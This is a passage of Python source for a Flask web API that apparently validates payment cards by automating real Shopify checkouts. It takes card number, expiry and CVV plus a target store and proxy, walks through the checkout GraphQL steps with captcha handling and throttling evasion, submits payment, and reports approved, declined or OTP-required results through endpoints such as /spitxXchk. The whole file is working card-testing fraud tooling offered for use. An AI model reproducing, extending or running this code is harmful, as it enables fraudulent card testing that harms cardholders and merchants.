                                    'zoneCode': state, 'phone': phone
                                }
                            },
                            'selectedDeliveryStrategy': {
                                'deliveryStrategyMatchingConditions': {
                                    'estimatedTimeInTransit': {'any': True},
                                    'shipments': {'any': True}
                                },
                                'options': {}
                            },
                            'targetMerchandiseLines': {'any': True},
                            'deliveryMethodTypes': ['SHIPPING'],
                            'expectedTotalPrice': {'any': True},
                            'destinationChanged': True
                        }],
                        'noDeliveryRequired': [],
                        'useProgressiveRates': False,
                        'prefetchShippingRatesStrategy': None,
                        'supportsSplitShipping': True
                    },
                    'deliveryExpectations': {'deliveryExpectationLines': []},
                    'merchandise': {
                        'merchandiseLines': [{
                            'stableId': stableId or '1',
                            'merchandise': {
                                'productVariantReference': {
                                    'id': f'gid://shopify/ProductVariantMerchandise/{merch}',
                                    'variantId': f'gid://shopify/ProductVariant/{variant_id}',
                                    'properties': [],
                                    'sellingPlanId': None,
                                    'sellingPlanDigest': None
                                }
                            },
                            'quantity': {'items': {'value': 1}},
                            'expectedTotalPrice': {'value': {'amount': subtotal, 'currencyCode': currency}},
                            'lineComponentsSource': None,
                            'lineComponents': []
                        }]
                    },
                    'payment': {
                        'totalAmount': {'any': True},
                        'paymentLines': [],
                        'billingAddress': {
                            'streetAddress': {
                                'address1': '', 'city': '', 'countryCode': country_code,
                                'lastName': '', 'zoneCode': 'ENG', 'phone': ''
                            }
                        }
                    },
                    'buyerIdentity': {
                        'customer': {'presentmentCurrency': currency, 'countryCode': country_code},
                        'email': email,
                        'emailChanged': False,
                        'phoneCountryCode': country_code,
                        'marketingConsent': [{'email': {'value': email}}],
                        'shopPayOptInPhone': {'countryCode': country_code},
                        'rememberMe': False
                    },
                    'tip': {'tipLines': []},
                    'taxes': {
                        'proposedAllocations': None,
                        'proposedTotalAmount': {'value': {'amount': '0', 'currencyCode': currency}},
                        'proposedTotalIncludedAmount': None,
                        'proposedMixedStateTotalAmount': None,
                        'proposedExemptions': []
                    },
                    'note': {'message': None, 'customAttributes': []},
                    'localizationExtension': {'fields': []},
                    'nonNegotiableTerms': None,
                    'scriptFingerprint': {
                        'signature': None,
                        'signatureUuid': None,
                        'lineItemScriptChanges': [],
                        'paymentScriptChanges': [],
                        'shippingScriptChanges': []
                    },
                    'optionalDuties': {'buyerRefusesDuties': False}
                },
                'operationName': 'Proposal'
            }

            graphql_url = f'https://{urlparse(ourl).netloc}/checkouts/unstable/graphql'

            max_proposal_retries = 4
            resp_text = None
            resp_json = None
            for proposal_attempt in range(max_proposal_retries + 1):
                if proposal_attempt > 0:
                    await asyncio.sleep(random.uniform(2.5, 5.0))

                response, resp_text, captcha_solved = await make_graphql_request_with_captcha_handling(
                    session, graphql_url, params, headers, json_data, checkout_url, max_retries=1, proxy=proxy
                )

                if not response:
                    if proposal_attempt >= max_proposal_retries:
                        return False, f"Request failed: {resp_text}", gateway, total_price, currency
                    continue

                if is_captcha_required(resp_text):
                    return False, "CAPTCHA_REQUIRED", gateway, total_price, currency

                try:
                    resp_json = json.loads(resp_text)
                except json.JSONDecodeError as e:
                    if proposal_attempt >= max_proposal_retries:
                        return False, f"Invalid JSON response: {str(e)}", gateway, total_price, currency
                    continue

                if 'errors' in resp_json:
                    errors = resp_json.get('errors', [])
                    error_msgs = [e.get('message', str(e)) for e in errors[:3]]
                    return False, f"GraphQL Error: {'; '.join(error_msgs)}", gateway, total_price, currency

                try:
                    if 'data' not in resp_json:
                        raise KeyError("data missing")
                    session_data = resp_json['data'].get('session')
                    if session_data is None:
                        raise KeyError("session null")
                    negotiate = session_data.get('negotiate')
                    if negotiate is None:
                        raise KeyError("negotiate null")
                    result = negotiate.get('result')
                    if result is None:
                        raise KeyError("result null")
                    result_type = result.get('__typename', 'Unknown')
                    if result_type == 'CheckpointDenied':
                        return False, "Checkpoint Denied", gateway, total_price, currency
                    if result_type == 'Throttled':
                        poll_after = result.get('pollAfter', 3)
                        sleep_time = float(poll_after) if isinstance(poll_after, (int, float)) else 5.0
                        if proposal_attempt < max_proposal_retries:
                            await asyncio.sleep(sleep_time + random.uniform(1, 2))
                            continue
                        return False, "RATE_LIMITED_BY_SHOPIFY", gateway, total_price, currency
                    if result_type == 'NegotiationResultFailed':
                        if proposal_attempt < max_proposal_retries:
                            continue
                        return False, "Negotiation failed", gateway, total_price, currency
                    break
                except (KeyError, TypeError) as e:
                    if proposal_attempt >= max_proposal_retries:
                        return False, f"Failed to parse proposal response: {str(e)}", gateway, total_price, currency
                    continue

            if resp_json is None or 'data' not in resp_json:
                return False, "No data in proposal response", gateway, total_price, currency

            session_data = resp_json['data'].get('session')
            negotiate = session_data.get('negotiate')
            result = negotiate.get('result')

            checkpoint_data = result.get('checkpointData')

            seller_proposal = result.get('sellerProposal')
            if seller_proposal is None:
                return False, "Seller proposal is null", gateway, total_price, currency

            delivery_data = seller_proposal.get('delivery')
            running_total_data = seller_proposal.get('runningTotal')

            if not running_total_data:
                return False, "No runningTotal in sellerProposal", gateway, total_price, currency

            running_total = running_total_data['value']['amount']

            real_subtotal = None
            merch_block = seller_proposal.get('merchandise') or {}
            if merch_block.get('__typename') == 'FilledMerchandiseTerms':
                for line in merch_block.get('merchandiseLines', []) or []:
                    ta = line.get('totalAmount') or {}
                    v = ta.get('value') or {}
                    if v.get('amount'):
                        real_subtotal = v['amount']
                        break

            if not real_subtotal:
                sbt = seller_proposal.get('subtotalBeforeTaxesAndShipping') or {}
                sv = sbt.get('value') or {}
                if sv.get('amount'):
                    real_subtotal = sv['amount']

            if real_subtotal:
                try:
                    rv = float(real_subtotal)
                    if rv > 0:
                        subtotal = real_subtotal
                except (ValueError, TypeError):
                    pass

            if not delivery_data:
                return False, "No delivery data in proposal", gateway, total_price, currency
            
            delivery_type = delivery_data.get('__typename', '')
            
            if delivery_type == 'PendingTerms':
                delivery_strategy = ''
                shipping_amount = 0.0
            elif delivery_type == 'FilledDeliveryTerms':
                delivery_lines = delivery_data.get('deliveryLines', [{}])
                if delivery_lines and len(delivery_lines) > 0:
                    available_strategies = delivery_lines[0].get('availableDeliveryStrategies', [])
                    if available_strategies and len(available_strategies) > 0:
                        delivery_strategy = available_strategies[0].get('handle', '')
                        shipping_amount_data = available_strategies[0].get('amount', {}).get('value', {}).get('amount', '0')
                        try:
                            shipping_amount = float(shipping_amount_data)
                        except:
                            shipping_amount = 0.0
                    else:
                        delivery_strategy = ''
                        shipping_amount = 0.0
                else:
                    delivery_strategy = ''
                    shipping_amount = 0.0
            else:
                delivery_strategy = ''
                shipping_amount = 0.0
            
            try:
                tax_data = seller_proposal.get('tax', {})
                if tax_data and tax_data.get('__typename') == 'FilledTaxTerms':
                    tax_amount_data = tax_data.get('totalTaxAmount', {}).get('value', {}).get('amount', '0')
                    tax_amount = float(tax_amount_data)
                else:
                    tax_amount = 0.0
            except:
                tax_amount = 0.0

            payment_data = seller_proposal.get('payment', {})
            if payment_data and payment_data.get('__typename') == 'FilledPaymentTerms':
                payment_methods = payment_data.get('availablePaymentLines', [])
                for method in payment_methods:
                    payment_method = method.get('paymentMethod', {})
                    if payment_method.get('name') or payment_method.get('paymentMethodIdentifier'):
                        payment_identifier = payment_method.get('paymentMethodIdentifier')
                        displayName = payment_method.get('extensibilityDisplayName') or payment_method.get('name', 'Unknown')
                        
                        gateway = payment_method.get('extensibilityDisplayName') or payment_method.get('name', 'UNKNOWN')
                        total_price = str(float(running_total) + shipping_amount + tax_amount)
                        
                        break
            
            if not payment_identifier:
                return False, "No valid payment method found", gateway, total_price, currency
            
            json_data['query'] = QUERY_PROPOSAL_DELIVERY
            json_data['variables']['delivery']['deliveryLines'][0]['selectedDeliveryStrategy'] = {
                'deliveryStrategyByHandle': {
                    'handle': delivery_strategy if delivery_strategy else '',
                    'customDeliveryRate': False
                },
                'options': {}
            }
            json_data['variables']['delivery']['deliveryLines'][0]['targetMerchandiseLines'] = {
                'lines': [{'stableId': stableId or '1'}]
            }
            json_data['variables']['delivery']['deliveryLines'][0]['expectedTotalPrice'] = {
                'value': {'amount': str(shipping_amount), 'currencyCode': currency}
            }
            json_data['variables']['delivery']['deliveryLines'][0]['destinationChanged'] = False
            json_data['variables']['payment']['billingAddress'] = {
                'streetAddress': {
                    'address1': street, 'address2': address2, 'city': city,
                    'countryCode': country_code, 'postalCode': s_zip,
                    'firstName': firstName, 'lastName': lastName,
                    'zoneCode': state, 'phone': phone
                }
            }
            json_data['variables']['taxes']['proposedTotalAmount']['value']['amount'] = str(tax_amount)
            json_data['variables']['buyerIdentity']['shopPayOptInPhone']['number'] = phone

            response, resp_text, captcha_solved = await make_graphql_request_with_captcha_handling(
                session, graphql_url, params, headers, json_data, checkout_url, max_retries=2, proxy=proxy
            )

            if is_captcha_required(resp_text):
                return False, "CAPTCHA_REQUIRED on delivery proposal", gateway, total_price, currency

            payload = {
                "credit_card": {
                    "number": cc,
                    "month": int(mes),
                    "year": int(ano),
                    "verification_value": cvv,
                    "start_month": None,
                    "start_year": None,
                    "issue_number": "",
                    "name": f"{firstName} {lastName}"
                },
                "payment_session_scope": urlparse(url).netloc
            }
            
            vault_headers = {
                'Content-Type': 'application/json',
                'Accept': 'application/json',
                'Accept-Language': 'en-US,en;q=0.9',
                'Origin': 'https://checkout.pci.shopifyinc.com',
                'Referer': 'https://checkout.pci.shopifyinc.com/build/a8e4a94/number-ltr.html?identifier=&locationURL=',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0',
                'sec-ch-ua': '"Chromium";v="146", "Not-A.Brand";v="24", "Microsoft Edge";v="146"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-storage-access': 'active',
            }
            if ident_sig:
                vault_headers['shopify-identification-signature'] = ident_sig
            
            response = await session.post('https://checkout.pci.shopifyinc.com/sessions', json=payload, headers=vault_headers, proxy=proxy)
            try:
                token_data = await response.json()
                token = token_data.get('id')
                if not token:
                    return False, 'Unable to get payment token', gateway, total_price, currency
            except Exception as e:
                return False, f'Unable to get payment token: {str(e)}', gateway, total_price, currency

            params = {'operationName': 'SubmitForCompletion'}
            
            submit_variables = {
                'input': {
                    'sessionInput': {'sessionToken': sst},
                    'queueToken': queueToken or '',
                    'discounts': {'lines': [], 'acceptUnexpectedDiscounts': True},
                    'delivery': {
                        'deliveryLines': [{
                            'destination': {
                                'streetAddress': {
                                    'address1': street, 'address2': address2, 'city': city,
                                    'countryCode': country_code, 'postalCode': s_zip,
                                    'firstName': firstName, 'lastName': lastName,
                                    'zoneCode': state, 'phone': phone
                                }
                            },
                            'selectedDeliveryStrategy': {
                                'deliveryStrategyByHandle': {
                                    'handle': delivery_strategy if delivery_strategy else '',
                                    'customDeliveryRate': False
                                },
                                'options': {'phone': phone}
                            },
                            'targetMerchandiseLines': {
                                'lines': [{'stableId': stableId or '1'}]
                            },
                            'deliveryMethodTypes': ['SHIPPING'],
                            'expectedTotalPrice': {
                                'value': {'amount': str(shipping_amount), 'currencyCode': currency}
                            },
                            'destinationChanged': False
                        }],
                        'noDeliveryRequired': [],
                        'useProgressiveRates': True,
                        'prefetchShippingRatesStrategy': None,
                        'supportsSplitShipping': True
                    },
                    'merchandise': {
                        'merchandiseLines': [{
                            'stableId': stableId or '1',
                            'merchandise': {
                                'productVariantReference': {
                                    'id': f'gid://shopify/ProductVariantMerchandise/{merch}',
                                    'variantId': f'gid://shopify/ProductVariant/{variant_id}',
                                    'properties': [],
                                    'sellingPlanId': None,
                                    'sellingPlanDigest': None
                                }
                            },
                            'quantity': {'items': {'value': 1}},
                            'expectedTotalPrice': {
                                'value': {'amount': subtotal, 'currencyCode': currency}
                            },
                            'lineComponentsSource': None,
                            'lineComponents': []
                        }]
                    },
                    'payment': {
                        'totalAmount': {'any': True},
                        'paymentLines': [{
                            'paymentMethod': {
                                'directPaymentMethod': {
                                    'paymentMethodIdentifier': payment_identifier,
                                    'sessionId': token,
                                    'billingAddress': {
                                        'streetAddress': {
                                            'address1': street, 'address2': address2,
                                            'city': city, 'countryCode': country_code,
                                            'postalCode': s_zip, 'firstName': firstName,
                                            'lastName': lastName, 'zoneCode': state,
                                            'phone': phone
                                        }
                                    },
                                    'cardSource': None
                                }
                            },
                            'amount': {
                                'value': {'amount': running_total, 'currencyCode': currency}
                            },
                            'dueAt': None
                        }],
                        'billingAddress': {
                            'streetAddress': {
                                'address1': street, 'address2': address2,
                                'city': city, 'countryCode': country_code,
                                'postalCode': s_zip, 'firstName': firstName,
                                'lastName': lastName, 'zoneCode': state,
                                'phone': phone
                            }
                        }
                    },
                    'buyerIdentity': {
                        'customer': {'presentmentCurrency': currency, 'countryCode': country_code},
                        'email': email,
                        'emailChanged': False,
                        'phoneCountryCode': country_code,
                        'marketingConsent': [{'email': {'value': email}}],
                        'shopPayOptInPhone': {'number': phone, 'countryCode': country_code},
                        'rememberMe': False
                    },
                    'taxes': {
                        'proposedAllocations': None,
                        'proposedTotalAmount': {
                            'value': {'amount': str(tax_amount), 'currencyCode': currency}
                        },
                        'proposedTotalIncludedAmount': None,
                        'proposedMixedStateTotalAmount': None,
                        'proposedExemptions': []
                    },
                    'tip': {'tipLines': []},
                    'note': {'message': None, 'customAttributes': []},
                    'localizationExtension': {'fields': []},
                    'nonNegotiableTerms': None,
                    'optionalDuties': {'buyerRefusesDuties': False}
                },
                'attemptToken': attempt_token,
                'metafields': [],
                'analytics': {'requestUrl': checkout_url}
            }
            
            if checkpoint_data:
                submit_variables['input']['checkpointData'] = checkpoint_data
            
            submit_json_data = {
                'query': MUTATION_SUBMIT,
                'variables': submit_variables,
                'operationName': 'SubmitForCompletion'
            }

            response, text, captcha_solved = await make_graphql_request_with_captcha_handling(
                session, graphql_url, params, headers, submit_json_data, checkout_url, max_retries=2, proxy=proxy
            )

            if is_captcha_required(text):
                return False, "CAPTCHA_REQUIRED on submit", gateway, total_price, currency
            
            if "Your order total has changed." in text:
                return False, "Site not supported", gateway, total_price, currency
            if "The requested payment method is not available." in text:
                return False, "Payment method not available", gateway, total_price, currency
            
            try:
                resp_json = json.loads(text)
                submit_data = resp_json.get('data', {}).get('submitForCompletion', {})
                
                if not submit_data:
                    errors = resp_json.get('errors', [])
                    if errors:
                        for error in errors:
                            code = error.get('code')
                            if code:
                                return False, code, gateway, total_price, currency
                    return False, "Empty submit response", gateway, total_price, currency
                
                result_type = submit_data.get('__typename', '')
                
                if result_type == 'Throttled':
                     poll_after = submit_data.get('pollAfter', 5)
                     sleep_time = float(poll_after) if isinstance(poll_after, (int, float)) else 5.0
                     await asyncio.sleep(sleep_time + random.uniform(1, 2))
                     return False, "RATE_LIMITED_ON_SUBMIT", gateway, total_price, currency

                if result_type in ['SubmitSuccess', 'SubmittedForCompletion', 'SubmitAlreadyAccepted']:
                    receipt = submit_data.get('receipt', {})
                    if receipt:
                        receipt_type = receipt.get('__typename', '')
                        
                        if receipt_type == 'ProcessedReceipt':
                            return True, "ORDER_PLACED", gateway, total_price, currency
                        
                        rid = receipt.get('id')
                    else:
                        return False, "SubmitSuccess but no receipt", gateway, total_price, currency
                
                elif result_type == 'SubmitFailed':
                    reason = submit_data.get('reason', 'Unknown reason')
                    return False, extract_clean_response(reason), gateway, total_price, currency
                
                elif result_type == 'SubmitRejected':
                    errors = submit_data.get('errors', [])
                    if errors:
                        for error in errors:
                            code = error.get('code', '')
                            localized_msg = error.get('localizedMessage', '')
                            non_localized_msg = error.get('nonLocalizedMessage', '')
                            if code in ('GENERIC_ERROR', 'PAYMENT_FAILED', ''):
                                detail = localized_msg or non_localized_msg
                                if detail:
                                    return False, detail, gateway, total_price, currency
                            if code:
                                return False, code, gateway, total_price, currency
                    return False, "Submit Rejected", gateway, total_price, currency
                
                receipt = submit_data.get('receipt', {})
                if not receipt:
                    return False, "No receipt in submit response", gateway, total_price, currency
                
                rid = receipt.get('id')
                if not rid:
                    return False, "No receipt ID", gateway, total_price, currency
                
            except json.JSONDecodeError:
                return False, f"Invalid JSON in submit response: {text[:100]}", gateway, total_price, currency
            except Exception as e:
                return False, f"Error parsing submit: {str(e)}", gateway, total_price, currency

            params = {'operationName': 'PollForReceipt'}
            poll_json_data = {
                'query': QUERY_POLL,
                'variables': {'receiptId': rid, 'sessionToken': sst},
                'operationName': 'PollForReceipt'
            }

            await asyncio.sleep(3)
            
            for i in range(4):
                response, final_text, captcha_solved = await make_graphql_request_with_captcha_handling(
                    session, graphql_url, params, headers, poll_json_data,
                    checkout_url, max_retries=2, proxy=proxy
                )
                
                if is_captcha_required(final_text):
                    return True, "CARD_DECLINED", gateway, total_price, currency
                
                try:
                    poll_json = json.loads(final_text)
                    receipt_data = poll_json.get('data', {}).get('receipt', {})
                    
                    if receipt_data:
                        typename = receipt_data.get('__typename', '')
                        
                        if typename == 'ProcessedReceipt':
                            return True, "ORDER_PLACED", gateway, total_price, currency
                        elif typename == 'FailedReceipt':
                            error = receipt_data.get('processingError', {})
                            error_type = error.get('__typename', '')
                            if error_type == 'PaymentFailed':
                                code = error.get('code', '')
                                msg = error.get('messageUntranslated', '')
                                if code in ('GENERIC_ERROR', 'PAYMENT_FAILED', '') and msg:
                                    return True, msg, gateway, total_price, currency
                                return True, code if code else 'PAYMENT_FAILED', gateway, total_price, currency
                            code = error.get('code') or error_type or 'UNKNOWN_ERROR'
                            return True, code, gateway, total_price, currency
                        elif typename == 'ActionRequiredReceipt':
                            return True, "OTP_REQUIRED", gateway, total_price, currency
                        
                        if receipt_data.get('__typename') in ['ProcessingReceipt', 'WaitingReceipt']:
                            await asyncio.sleep(4)
                            continue
                        
                except Exception as e:
                    pass
                
                if 'WaitingReceipt' in final_text:
                    await asyncio.sleep(4)
                else:
                    break
            
            if 'CAPTCHA_REQUIRED' in final_text:
                return True, "CARD_DECLINED", gateway, total_price, currency
            
            if 'WaitingReceipt' in final_text:
                return False, "Change Proxy or Site", gateway, total_price, currency
            
            try:
                res_json = json.loads(final_text)
                result = res_json.get('data', {}).get('receipt', {}).get('processingError', {}).get('code')
                
                if "shopify_payments" in str(res_json):
                    return True, "ORDER_PLACED", gateway, total_price, currency
                elif result:
                    return True, result, gateway, total_price, currency
                else:
                    return True, "MISMATCHED_BILL", gateway, total_price, currency
            except:
                pass
            
            code = extract_between(final_text, '{"code":"', '"')
            
            final_lower = final_text.lower()
            if 'actionreq' in final_lower or 'action_required' in final_lower:
                return True, f"OTP_REQUIRED", gateway, total_price, currency
            elif 'processedreceipt' in final_lower:
                return True, f"ORDER_PLACED", gateway, total_price, currency
            elif 'failedreceipt' in final_lower or 'declined' in final_lower:
                return True, code if code else "CARD_DECLINED", gateway, total_price, currency
            else:
                return False, f"Unknown Result", gateway, total_price, currency

    except Exception as e:
        return False, f"Error Processing Card: {str(e)}", gateway, total_price, currency

def parse_cc_string(cc_string):
    parts = cc_string.split('|')
    if len(parts) != 4:
        raise ValueError("Invalid CC format. Use: CC|MM|YYYY|CVV")
    return {
        'cc': parts[0].strip(),
        'mes': parts[1].strip(),
        'ano': parts[2].strip(),
        'cvv': parts[3].strip()
    }

async def process_card_async(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=None):
    return await process_card(cc, mes, ano, cvv, site_url, variant_id, proxy_str)

app = Flask(__name__)

@app.route('/shopify', methods=['GET'])
def shopify_checker():
    start_time = time.time()
    try:
        site = request.args.get('site')
        cc_string = request.args.get('cc')
        proxy_str = request.args.get('proxy')

        if not site:
            return jsonify({
                "error": "Missing 'site' parameter",
                "status": False
            }), 400

        if not cc_string:
            return jsonify({
                "error": "Missing 'cc' parameter in format CC|MM|YYYY|CVV",
                "status": False
            }), 400

        try:
            cc_parts = parse_cc_string(cc_string)
            cc = cc_parts['cc']
            mes = cc_parts['mes']
            ano = cc_parts['ano']
            cvv = cc_parts['cvv']
        except ValueError as e:
            return jsonify({
                "error": str(e),
                "status": False
            }), 400

        variant_id = request.args.get('variant')

        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)

        try:
            success, message, gateway, price, currency = loop.run_until_complete(
                process_card_async(cc, mes, ano, cvv, site, variant_id, proxy_str)
            )
        finally:
            loop.close()

        clean_response = extract_clean_response(message)
        elapsed = round(time.time() - start_time, 2)

        response_data = {
            "Gateway": gateway,
            "Price": float(price) if price.replace('.', '', 1).isdigit() else 0.0,
            "Currency": currency or "USD",
            "Time": f"{elapsed}s",
            "Response": clean_response,
            "Status": success,
            "cc": cc_string
        }

        return jsonify(response_data)

    except Exception as e:
        elapsed = round(time.time() - start_time, 2)
        return jsonify({
            "error": str(e),
            "status": False,
            "Gateway": "UNKNOWN",
            "Price": 0.0,
            "Currency": "USD",
            "Time": f"{elapsed}s",
            "Response": f"ERROR: {str(e)}",
            "cc": request.args.get('cc', '')
        }), 500

# ============================================================
# NEW ENDPOINT: spitxXchk
# Routes: /spitxXchk , /spitxXchk/shopii , /shopii
# Browser-friendly HTML when no params, JSON when site+cc given
# ============================================================
@app.route('/', methods=['GET'])
def _root_health():
    return (
        "<!doctype html><html><head><title>API Running</title></head>"
        "<body style='font-family:Arial;background:#0d0d0d;color:#0f0;padding:40px'>"
        "<h1>✅ API is running</h1>"
        "<p>Try: <code>/spitxXchk?site=https://store.com&cc=4111111111111111|12|2028|123&proxy=ip:port</code></p>"
        "</body></html>"
    ), 200, {"Content-Type": "text/html"}

@app.route('/spitxXchk', methods=['GET'])
@app.route('/spitxXchk/shopii', methods=['GET'])
@app.route('/shopii', methods=['GET'])
def spitxXchk():
    start_time = time.time()
    try:
        site = request.args.get('site')
        cc_string = request.args.get('cc')
        proxy_str = request.args.get('proxy')

        if not site and not cc_string:
            return (
                "<!doctype html><html><head><title>spitxXchk endpoint</title>"
                "<meta name='viewport' content='width=device-width,initial-scale=1'>"
                "<style>body{font-family:Arial,sans-serif;background:#0d0d0d;color:#eee;padding:40px;line-height:1.5}"
                "h1{color:#0f0}code{background:#1a1a1a;padding:4px 8px;border-radius:4px;color:#0ff}"
                ".ok{display:inline-block;padding:6px 12px;background:#0f0;color:#000;border-radius:6px;font-weight:bold}"
                "</style></head><body>"
                "<h1>✅ spitxXchk endpoint is LIVE</h1>"
                "<p><span class='ok'>RUNNING</span></p>"
                "<p><b>Usage:</b></p>"
                "<pre><code>/spitxXchk?site=https://yoursite.com&cc=4111111111111111|12|2028|123&proxy=ip:port[:user:pass]</code></pre>"
                "<p><b>Aliases:</b> <code>/shopii</code> &middot; <code>/spitxXchk/shopii</code></p>"
                "</body></html>"
            ), 200, {"Content-Type": "text/html"}

        if not site:
            return jsonify({
                "error": "Missing 'site' parameter",
                "status": False,
                "Response": "MISSING_SITE"
            }), 400

        if not cc_string:
            return jsonify({
                "error": "Missing 'cc' parameter in format CC|MM|YYYY|CVV",
                "status": False,
                "Response": "MISSING_CC"
            }), 400

        try:
            cc_parts = parse_cc_string(cc_string)
            cc = cc_parts['cc']
            mes = cc_parts['mes']
            ano = cc_parts['ano']
            cvv = cc_parts['cvv']
        except ValueError as e:
            return jsonify({
                "error": str(e),
                "status": False,
                "Response": "BAD_CC_FORMAT"
            }), 400

        variant_id = request.args.get('variant')

        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)

        try:
            success, message, gateway, price, currency = loop.run_until_complete(
                process_card_async(cc, mes, ano, cvv, site, variant_id, proxy_str)
            )
        finally:
            loop.close()

        clean_response = extract_clean_response(message)
        elapsed = round(time.time() - start_time, 2)

        response_data = {
            "Gateway": gateway,
            "Price": float(price) if price.replace('.', '', 1).isdigit() else 0.0,
            "Currency": currency or "USD",
            "Time": f"{elapsed}s",
            "Response": clean_response,
            "Status": success,
            "cc": cc_string
        }

        return jsonify(response_data)

    except Exception as e:
        elapsed = round(time.time() - start_time, 2)
        return jsonify({
            "error": str(e),
            "status": False,
            "Gateway": "UNKNOWN",
            "Price": 0.0,
            "Currency": "USD",
            "Time": f"{elapsed}s",
            "Response": f"ERROR: {str(e)}",
            "cc": request.args.get('cc', '')
        }), 500


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
